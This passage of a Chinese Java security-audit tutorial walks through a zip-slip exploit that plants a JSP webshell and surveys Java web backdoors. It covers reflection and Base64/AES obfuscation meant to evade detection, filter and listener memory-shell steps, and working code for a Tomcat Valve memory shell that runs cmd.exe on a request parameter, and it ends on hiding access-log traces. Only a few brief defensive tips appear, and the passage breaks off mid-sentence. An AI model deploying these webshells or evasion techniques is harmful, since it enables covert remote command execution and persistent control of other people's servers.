unzip方法的内容</p><p>可以通过以下步骤来验证该漏洞。</p><h6 id="（1）攻击者制作恶意ZIP文件（包含webshell）。"><a href="#（1）攻击者制作恶意ZIP文件（包含webshell）。" class="headerlink" title="（1）攻击者制作恶意ZIP文件（包含webshell）。"></a>（1）攻击者制作恶意ZIP文件（包含webshell）。</h6><p>通过执行以下Python脚本创建恶意的ZIP文件test5.zip。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261915905.png" alt="image-20220426191525801"></p><p>注意，使用好压打开test5.zip，可以发现safedog.html 所处的路径是“test5.zip……”，如图6-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261918318.png" alt="image-20220426191851176"></p><p>图6-33　safedog.html 所处的路径信息</p><p>接着，攻击者准备包含JSP版webshell的WAR包。该JSP文件的核心代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261919324.png" alt="image-20220426191934215"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261919561.png" alt="image-20220426191956449"></p><p>然后通过IDEA生成WAR包，步骤如下。</p><p>进入“Build”下拉菜单，单击“Build Artifacts…”，如图6-34所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261922945.png" alt="image-20220426192220732"></p><p>图6-34　“Build”下拉菜单中的“Build Artifacts…”</p><p>选择“:war”模式（直接生成WAR包）或“:war exploded”模式（未直接生成WAR包，但支持热部署）选项。这里选择“:war exploded”模式，如图6-35所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261925421.png" alt="image-20220426192553239"></p><p>图6-35　选择“:war exploded”模式</p><p>接着，我们可以在IDEA工程的target目录下发现新生成的目录“FastjsonDeserializationVul”，进入该目录，全选该Web工程的所有文件并打包成WAR包，如图6-36所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261927071.png" alt="image-20220426192754885"></p><p>图6-36　打包WAR文件</p><p>将刚刚压缩成的WAR包拖曳到“test5.zip”，如图6-37所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261928706.png" alt="image-20220426192818469"></p><p>图6-37　将WAR包拖曳到“test5.zip”</p><p>至此，本次漏洞验证过程所需的webshell的恶意ZIP文件已被生成。</p><h6 id="（2）攻击者在网站后台上传步骤（1）生成的恶意ZIP文件。"><a href="#（2）攻击者在网站后台上传步骤（1）生成的恶意ZIP文件。" class="headerlink" title="（2）攻击者在网站后台上传步骤（1）生成的恶意ZIP文件。"></a>（2）攻击者在网站后台上传步骤（1）生成的恶意ZIP文件。</h6><p>单击“上传文件”按钮，上传test5.zip，如图6-38所示。</p><h6 id="3）攻击者在网站后台解压步骤（2）中上传的恶意ZIP文件。"><a href="#3）攻击者在网站后台解压步骤（2）中上传的恶意ZIP文件。" class="headerlink" title="3）攻击者在网站后台解压步骤（2）中上传的恶意ZIP文件。"></a>3）攻击者在网站后台解压步骤（2）中上传的恶意ZIP文件。</h6><p>单击“ZIP解压”按钮，如图6-39所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261929374.png" alt="image-20220426192916234"></p><p>图6-39　文件解压</p><p>此时，在服务器端查看webapps目录的变化，可以发现safedog.html和vul.war文件被解压到了网站根目录“webapps&#x2F;ROOT”外，如图6-40所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261929457.png" alt="image-20220426192937309"></p><p>图6-40　根目录变化</p><h6 id="（4）攻击者使用webshell。"><a href="#（4）攻击者使用webshell。" class="headerlink" title="（4）攻击者使用webshell。"></a>（4）攻击者使用webshell。</h6><p>在浏览器中访问以下链接：</p><p><a href="http://192.168.114.132:8080/vul/webshell.jsp?pwd=023&cmd=calc%E3%80%82">http://192.168.114.132:8080/vul/webshell.jsp?pwd=023&amp;cmd=calc。</a></p><p>可以看到攻击效果，如图6-41所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261930350.png" alt="image-20220426193023209"></p><p>图6-41　文件压缩漏洞的攻击效果</p><p>值得一提的是，该源程序其实已经有一定的安全防御措施，例如在网站的目录下访问上传的JSP文件会报403错误；“上传ZIP”的功能点可拦截本文档提及的“恶意ZIP文件”，而“上传文件”功能点不会进行这一拦截。</p><p>针对此类漏洞的防护，要增加解压ZIP包算法的防护逻辑，如使代码在解压每个条目之前对其文件名进行校验。如果某个条目校验未通过（预设解压路径与实际解压路径不一致），那么整个解压过程将会被终止。</p><h2 id="6-5-Web后门漏洞"><a href="#6-5-Web后门漏洞" class="headerlink" title="6.5　Web后门漏洞"></a>6.5　Web后门漏洞</h2><h3 id="6-5-1-Web后门漏洞简介"><a href="#6-5-1-Web后门漏洞简介" class="headerlink" title="6.5.1　Web后门漏洞简介"></a>6.5.1　Web后门漏洞简介</h3><p>Web 后门指的是以网页形式存在的一种代码执行环境，通过这种代码执行环境，攻击者可以利用浏览器来执行相关命令以达到控制网站服务器的目的。这里的代码执行环境其实是指编写后门所使用的语言，如PHP、ASP、JSP 等，业内通常称这种文件为 WebShell，其主要目的是用于后期维持权限。本节将简单介绍一些 Java的 Web 后门。</p><h3 id="6-5-2-Java-Web-后门案例讲解"><a href="#6-5-2-Java-Web-后门案例讲解" class="headerlink" title="6.5.2　Java Web 后门案例讲解"></a>6.5.2　Java Web 后门案例讲解</h3><p>Java Web 是很多大型厂商的选择，也正是因为如此，Java Web 的安全问题日益得到重视，JSP Webshell 就是其中之一。最著名的莫过于 PHP的各种奇思妙想的后门，但与 PHP 不同的是，Java 是强类型语言，语言特性较为严格，不能够像 PHP 那样利用字符串组合当作系统函数使用，但即便如此，随着安全人员的进一步研究，依旧出现了很多奇思妙想的JSP Webshell。下面我们将通过几种不同的 JSP Webshell 来简单讲解Java Web 后门。</p><h4 id="1．函数调用"><a href="#1．函数调用" class="headerlink" title="1．函数调用"></a>1．函数调用</h4><p>与 PHP 中的命令执行函数 system() 和 eval() 类似，Java 中也存在命令执行函数，其中使用最频繁的是 java.lang.Runtime.exec() 和java.lang.ProcessBuilder.start()，通过调用这两个函数，可以编写简单的Java Web 后门。在 Java 中调用函数的方式有很多种，本节主要讲解&#x3D;&#x3D;直接调用&#x3D;&#x3D;和&#x3D;&#x3D;反射调用&#x3D;&#x3D;这两种类型的 Web 后门。</p><p>第一种是直接调用。顾名思义，就是通过直接调用命令执行函数的方法来构造 Web 后门，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261938361.png" alt="image-20220426193837266"></p><p>上述代码是一个简单的JSP一句话木马，&#x3D;&#x3D;但是这种类型的一句话后门是没有回显的&#x3D;&#x3D;，即当攻击者执行命令后无法看到返回的信息。因此这种后门通常用来反弹shell，比较常见的有回显的 JSP 一句话木马示例如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261940554.png" alt="image-20220426194047421"></p><p>这个一句话木马与前一个相比较，多了回显的功能，能够将攻击者执行命令后的结果反馈给攻击者，如图6-42所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261944499.png" alt="image-20220426194413373"></p><p>图6-42　JSP一句话木马回显结果</p><p>&#x3D;&#x3D;类似于这种一句话后门在审计时很容易被发现&#x3D;&#x3D;，只需要搜索关键函数Runtime.getRuntime().exec 就能够发现其是否是 Java Web 后门。</p><p>第二种是&#x3D;&#x3D;反射调用&#x3D;&#x3D;。通过上文我们了解到，当攻击者通过直接调用的方式在Web 站点植入一句话后，对于审计者来说，&#x3D;&#x3D;很容易通过查找关键函数来发现后门&#x3D;&#x3D;，因此有些攻击者选择更隐蔽的反射调用类 Web 后门，如以下示例代码。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261951697.png" alt="image-20220426195115587"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261952110.png" alt="image-20220426195244550"></p><p>在上述代码中，攻击者并没有采用直接使用类名调用方法的方式去构造后门，而是采用动态加载的方式，把所要&#x3D;&#x3D;调用的类&#x3D;&#x3D;与函数放到一个字符串的位置，然后利用各种变形（此处利用的是 Base64 编码）&#x3D;&#x3D;来达到对恶意类或函数隐藏的目的&#x3D;&#x3D;，即使通过关键函数搜索也没法发现后门。</p><p>此外，由于反射可以直接调用各种私有类方法，导致了利用反射编写的后门层出不穷，其中最有代表性的就是&#x3D;&#x3D;通过加载字节码编写的后门&#x3D;&#x3D;，这种后门使服务端动态地将字节码解析成Class，这样一来就可以达到“一句话木马”的效果。&#x3D;&#x3D;著名的客户端管理工具“冰蝎”就是采用了这种方式&#x3D;&#x3D;。如下示例代码就是采用这种方式的简单实现。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261956233.png" alt="image-20220426195600900"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261958611.png" alt="image-20220426195809491"></p><p>也是将要调用的函数aes加密并定义为k,然后再aes解密</p><p>对于此类后门通常采用后门扫描工具进行检测，在人工审计时通常着重关注其加密的函数，如BASE64Decoder()以及SecretKeySpec()等。</p><h4 id="2．JDK-特性"><a href="#2．JDK-特性" class="headerlink" title="2．JDK 特性"></a>2．JDK 特性</h4><p>JDK 全称为 Java Development Kit，是 Java 开发环境。我们通常所说的JDK 指的是 Java SE (Standard Edition) Development Kit。除此之外还有Java EE（Enterprise Edition）和 Java ME（Micro Edition）。从 JDK 诞生至今，每个版本都有不同的特性，利用这些特性可以编写出不同类型的 JavaWeb 后门。以下示例就是利用了Java 的相关特性来编写的 Java Web后门。</p><p>&#x3D;&#x3D;利用Lambda 表达式编写的 JSP 一句话木马。&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262004548.png" alt="image-20220426200438437"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262004989.png" alt="image-20220426200453883"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262005803.png" alt="image-20220426200543686"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262006148.png" alt="image-20220426200656034"></p><p>Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。</p><p>利用这个特性我们可以操作类名，从而达到躲避检测的目的。</p><p>与此类似，用户还可以利用Java 8 的新特性，访问接口中的默认方法——&#x3D;&#x3D;Reduce&#x3D;&#x3D;来编写 JSP 一句话木马，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262010855.png" alt="image-20220426201018747"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262011586.png" alt="image-20220426201102467"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262011675.png" alt="image-20220426201140570"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262011694.png" alt="image-20220426201156568"></p><p>Reduce 是一个最终操作，允许通过指定的函数将 stream 中的多个元素规约为一个元素，规约后的结果通过 Optional 接口表示，然后利用 replace 替换执行函数的字符串即可达到免杀的效果。</p><p>JDK 新版本的特性还有很多，并且此类后门的防患较为困难。对于初级审计者来说发现后门并不是重点任务，重点是发现源程序本身存在的漏洞，但学习Java Web 后门的相关知识对我们的审计能力同样能够起到相辅相成的作用，毕竟每一个 Java 代码执行漏洞在某种意义上来说都是一个 Java Web 后门。</p><h3 id="6-5-3-小结"><a href="#6-5-3-小结" class="headerlink" title="6.5.3　小结"></a>6.5.3　小结</h3><p>除根据函数调用编写方式和利用 JDK 特性编写的 Java Web后门外，还有很多其他更有趣的编写方式，如Java 中存在很多表达式，包括 OGNL、SpEL、MVEL、EL、Fel、JST+EL等，这些表达式都有自己的特性和写法。因此根据这些表达式的特性和写法也能够写出不同类型的Java Web后门，以及实现动态注册自定义 Controller实现的内存级webshell、内部类编写的 webshell等。对这些更深入的编写方式有兴趣的读者可以在互联网上自行收集资料，来加深对于 Java 代码审计的理解。</p><h3 id="6-5-4-如何实现webshell内存马"><a href="#6-5-4-如何实现webshell内存马" class="headerlink" title="6.5.4  如何实现webshell内存马"></a>6.5.4  如何实现webshell内存马</h3><p>目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p><p>实现：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204262035843.png" alt="image-20220426203505721"></p><h4 id="1-3-内存马类型"><a href="#1-3-内存马类型" class="headerlink" title="1.3 内存马类型"></a>1.3 内存马类型</h4><p>通过命令执行等方式动态&#x3D;&#x3D;注册一个新的&#x3D;&#x3D;listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p><p>根据内存马注入的方式，大致可以将内存马划分为如下两类</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">1.</span>servlet-api型<br>通过命令执行等方式动态注册一个新的listener、<span class="hljs-keyword">filter</span>或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如<span class="hljs-keyword">spring</span>的controller内存马，tomcat的valve内存马<br><span class="hljs-number">2.</span>字节码增强型<br>通过java的instrumentation动态修改已有代码，进而实现命令执行等功能<br></code></pre></td></tr></table></figure><h3 id="6-5-5-杂谈Java内存Webshell的攻与防"><a href="#6-5-5-杂谈Java内存Webshell的攻与防" class="headerlink" title="6.5.5 杂谈Java内存Webshell的攻与防"></a>6.5.5 杂谈Java内存Webshell的攻与防</h3><p>现在的内存Websell的利用方式个人感觉可以分为以下三种：</p><ol><li>基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：</li></ol><h3 id="基于tomcat的内存-Webshell-无文件攻击技术"><a href="#基于tomcat的内存-Webshell-无文件攻击技术" class="headerlink" title="基于tomcat的内存 Webshell 无文件攻击技术"></a>基于tomcat的内存 Webshell 无文件攻击技术</h3><p>通过&#x3D;&#x3D;动态注册一个Filter&#x3D;&#x3D;，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了。</p><p>要实现动态注册Filter，需要两个步骤。第一个步骤就是先达到能获取request和response，而第二个步骤是通过request或者response去&#x3D;&#x3D;动态注册Filter&#x3D;&#x3D;</p><h3 id="6-5-6-基于内存-Webshell-的无文件攻击技术研究"><a href="#6-5-6-基于内存-Webshell-的无文件攻击技术研究" class="headerlink" title="6.5.6 基于内存 Webshell 的无文件攻击技术研究"></a>6.5.6 基于内存 Webshell 的无文件攻击技术研究</h3><p><a href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a></p><h3 id="6-5-7-利-用“进程注入”实现无文件复活-WebShell"><a href="#6-5-7-利-用“进程注入”实现无文件复活-WebShell" class="headerlink" title="6.5.7 利 用“进程注入”实现无文件复活 WebShell"></a>6.5.7 利 用“进程注入”实现无文件复活 WebShell</h3><p><a href="https://www.freebuf.com/articles/web/172753.html">https://www.freebuf.com/articles/web/172753.html</a></p><h3 id="6-5-8JSP-Webshell那些事-–-攻击篇-上"><a href="#6-5-8JSP-Webshell那些事-–-攻击篇-上" class="headerlink" title="6.5.8JSP Webshell那些事 – 攻击篇(上)"></a>6.5.8JSP Webshell那些事 – 攻击篇(上)</h3><h3 id="6-5-9JSP-Webshell那些事——攻击篇（下）"><a href="#6-5-9JSP-Webshell那些事——攻击篇（下）" class="headerlink" title="6.5.9JSP Webshell那些事——攻击篇（下）"></a>6.5.9JSP Webshell那些事——攻击篇（下）</h3><p><a href="https://www.anquanke.com/post/id/214483#h3-13">https://www.anquanke.com/post/id/214483#h3-13</a></p><p>filterConfigs除了存放了filterDef还保存了当时的Context，从下面两幅图可以看到两个context是同一个东西</p><p>FilterMaps则对应了web.xml中配置的<filter-mapping>，里面代表了各个filter之间的调用顺序。</p><h4 id="综上所述，如果要实现filter型内存马要经过如下步骤："><a href="#综上所述，如果要实现filter型内存马要经过如下步骤：" class="headerlink" title="综上所述，如果要实现filter型内存马要经过如下步骤："></a>综上所述，如果要实现filter型内存马要经过如下步骤：</h4><ul><li>创建恶意filter</li><li>用filterDef对filter进行封装</li><li>将filterDef添加到filterDefs跟filterConfigs中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中</li></ul><h4 id="Listener主要分为以下三个大类："><a href="#Listener主要分为以下三个大类：" class="headerlink" title="Listener主要分为以下三个大类："></a>Listener主要分为以下三个大类：</h4><ul><li>ServletContext监听</li><li>Session监听</li><li>Request监听</li></ul><p>其中前两种都不适合作为内存Webshell，因为涉及到服务器的启动跟停止，或者是Session的建立跟销毁，目光就聚集到第三种对于请求的监听上面，其中最适合作为Webshell的要数ServletRequestListener，因为我们可以拿到每次请求的的事件：ServletRequestEvent，通过其中的getServletRequest()函数就可以拿到本次请求的request对象，从而加入我们的恶意逻辑 。</p><h4 id="综上所述，Listener类型Webshell的实现步骤如下："><a href="#综上所述，Listener类型Webshell的实现步骤如下：" class="headerlink" title="综上所述，Listener类型Webshell的实现步骤如下："></a>综上所述，Listener类型Webshell的实现步骤如下：</h4><ul><li>创建恶意Listener</li><li>将其添加到ApplicationEventListener中去</li></ul><p>Listener的添加步骤要比前两种简单得多，优先级也是三者中最高的。</p><h3 id="6-5-10-tomcat-结合shiro-无文件-webshell-的技术研究以及检测方法"><a href="#6-5-10-tomcat-结合shiro-无文件-webshell-的技术研究以及检测方法" class="headerlink" title="6.5.10 tomcat 结合shiro 无文件 webshell 的技术研究以及检测方法"></a>6.5.10 tomcat 结合shiro 无文件 webshell 的技术研究以及检测方法</h3><p><a href="https://paper.seebug.org/1233/">https://paper.seebug.org/1233/</a></p><p>tomcat-fiter</p><p>ffiterdef-fiterconfig-fitermap   但是payload过大，超过tomcat的限制。会导致tomcat报400 bad request错误。我们仔细分析可知，因为payload种需要加载Filter的class bytes。这一部分最小最小还需要3000多。所以我们需要将Filter的class byte，想办法加载至系统中。可以缩小我们动态加载Filter的payload大小。</p><p>1.1 class.forname</p><p><code>class.forname</code>会获取调用方的classloader，然后调用<code>forName0</code>，从调用方的classloader中查找类。当然，这是一个native方法，精简后源码如下 <a href="https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/java.base/share/native/libjava/Class.c#l104">https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/java.base/share/native/libjava/Class.c#l104</a></p><h3 id="6-5-11-利用“进程注入”实现无文件不死webshell"><a href="#6-5-11-利用“进程注入”实现无文件不死webshell" class="headerlink" title="6.5.11 利用“进程注入”实现无文件不死webshell "></a>6.5.11 <a href="https://www.cnblogs.com/rebeyond/p/9686213.html">利用“进程注入”实现无文件不死webshell </a></h3><p> memshell 利用java instrumentation在和hook进程句柄在文件中写入detect的检测和协助运行在jvm上的应用程序。 来达到无文件不死memshell</p><h3 id="6-5-12-Tomcat容器攻防笔记之Valve内存马出世"><a href="#6-5-12-Tomcat容器攻防笔记之Valve内存马出世" class="headerlink" title="6.5.12 Tomcat容器攻防笔记之Valve内存马出世"></a>6.5.12 Tomcat容器攻防笔记之Valve内存马出世</h3><p><a href="https://www.anquanke.com/post/id/225870">https://www.anquanke.com/post/id/225870</a></p><h5 id="一、何为Valve？能做些什么？"><a href="#一、何为Valve？能做些什么？" class="headerlink" title="一、何为Valve？能做些什么？"></a>一、何为Valve？能做些什么？</h5><p>Valve译文为阀门。在Tomcat中，四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper中，都有一个管道(PipeLine)及若干阀门(Valve)。</p><p>形象地打个比方，供水管道中的各个阀门，用来实现不同的功能，比方说控制流速、控制流通等等。</p><p>那么，Tomcat管道机制中的阀门(Valve)如出一辙，我们可以自行编写具备相应业务逻辑的Valve，并添加进相应的管道当中。这样，当客户端请求传递进来时，可以在提前相应容器中完成逻辑操作。</p><p>由于Valve并不以实体文件存在，深入容器内部不易发现，且又能执行我们想要的代码逻辑，是一个极好利用点，接下来我们继续分析一下。</p><h5 id="二、Valve的机制？"><a href="#二、Valve的机制？" class="headerlink" title="二、Valve的机制？"></a>二、Valve的机制？</h5><p>每个容器对象都有一个PipeLine模块，在PipeLine模块中又含有若干Value(默认情况下只有一个)。</p><p>PipeLine伴随容器类对象生成时自动生成，就像容器的逻辑总线，按照顺序加载各个Valve，而Valve是逻辑的具体实现，通过PipeLine完成各个Valve之间的调用。</p><p>在PipeLine生成时，同时会生成一个缺省Valve实现，就是我们在调试中经常看到的StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve</p><p>在Tomcat中，有四大容器类，它们各自拥有独立的管道PipeLine，当各个容器类调用getPipeLine().getFirst().invoke(Request req, Response resp)时，会首先调用用户添加的Valve，最后再调用缺省的Standard-Valve。</p><p>注意，每一个上层的Valve都是在调用下一层的Valve，并等待下层的Valve返回后才完成的，这样上层的Valve不仅具有Request对象，同时还能获取到Response对象。使得各个环节的Valve均具备了处理请求和响应的能力。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272107385.png" alt="image-20220427210718260"></p><h5 id="三、Valve的调用和继承关系？"><a href="#三、Valve的调用和继承关系？" class="headerlink" title="三、Valve的调用和继承关系？"></a>三、Valve的调用和继承关系？<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272109675.png" alt="image-20220427210917542"></h5><p>在CoyoteAdapter#service方法中，调用StandardEngine#getPipline()方法获取其pipeline，随后获取管道中第一个valve并调用该阀门的invoke方法。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272123358.png" alt="image-20220427212356240"></p><p>在Tomcat默认的servler.xml配置中，定义了一个用于记录日志的Valve，查看这个org.apache.catalina.valves.AccessLogValve类</p><p><a href="https://p3.ssl.qhimg.com/t01d734182e5be40dd0.png![image-20220427212440297](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272124053.png)![image-20220427212523139](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272125249.png)">https://p3.ssl.qhimg.com/t01d734182e5be40dd0.png![image-20220427212440297](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272124053.png)![image-20220427212523139](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272125249.png)</a></p><p>继承于ValveBase类，而ValveBase又继承了LifeCycleMBeanBase类，ValveBase作为Tomcat的一个抽象基础类，实现了生命周期接口及MBean接口，使得我们可以专注于阀门的逻辑处理。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272127838.png" alt="image-20220427212709725"></p><p>而PipeLine也实现了addValve的方法。</p><p>经过以上分析，那么我们只需要编写一个继承于ValveBase的类，并重写Invoke方法，随后调用相应容器实例的getPipeline方法，再调用管道的addValve方法即可。</p><h5 id="四、Valve代码编写"><a href="#四、Valve代码编写" class="headerlink" title="四、Valve代码编写"></a>四、Valve代码编写</h5><p>按照惯例，所用的包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br></code></pre></td></tr></table></figure><p>编写恶意Valve，注意到调用this.getNext().invoke(req,resp)方法调用下一个Valve，否则会在该Valve终止，影响后续的响应：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">myValue</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span>&#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request req, Response resp)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>          <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>              <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).getInputStream();<br>              <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>              <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>              resp.getWriter().write(o);<br>          &#125;<br>          <span class="hljs-built_in">this</span>.getNext().invoke(req, resp);<br>      &#125;<br>  &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;ValveBase&#x3D;&#x3D;</p><p>&#x3D;&#x3D;invoke(Request req, Response resp)&#x3D;&#x3D;</p><p>&#x3D;&#x3D;req.getParameter(“cmd”)&#x3D;&#x3D;</p><p>&#x3D;&#x3D;this.getNext().invoke(req, resp);&#x3D;&#x3D;</p><p>注入到StandardContext中，当然你也可以注入到其他容器类，至于这里获取StandardContext的方法可以参考下一篇关于隐藏访问记录的文章：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-type">Valve</span> <span class="hljs-variable">myValve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">myValue</span>();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> context.getPipeline();<br>    pipeline.addValve(myValve);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="6-5-13-Tomcat容器攻防笔记之隐匿行踪-实战中怎么配合内存码用是个重点"><a href="#6-5-13-Tomcat容器攻防笔记之隐匿行踪-实战中怎么配合内存码用是个重点" class="headerlink" title="6.5.13 Tomcat容器攻防笔记之隐匿行踪(实战中怎么配合内存码用是个重点)"></a>6.5.13 Tomcat容器攻防笔记之隐匿行踪(实战中怎么配合内存码用是个重点)</h3><p>基于默认配置启动的Tomcat会在logs目录中产生以下五类日志：catalina、localhost、localhost_access、host-manager、manager</p><ul><li>catalina：记录了Catalina引擎的日志文件</li><li>localhost：记录了Tomcat内部代码抛出的日志</li><li>localhost_access: 记录了Tomcat的访问日志</li><li>host-manager以及manager：记录的是Tomcat的webapps目录下manager的应用日志</li></ul><p>既然是跟隐藏访问记录有关，本次对localhost_access日志的调用逻辑和调用流程进行调试学习</p><h4 id="二、Tomcat记录访问日志的流程细节？"><a href="#二、Tomcat记录访问日志的流程细节？" class="headerlink" title="二、Tomcat记录访问日志的流程细节？"></a>二、Tomcat记录访问日志的流程细节？</h4><p>Tomcat是对客户端的请求完成响应后，再进行访问日志记录的。具体实现在CoyoteAdapter#service方法，下图第二个红框处。<img 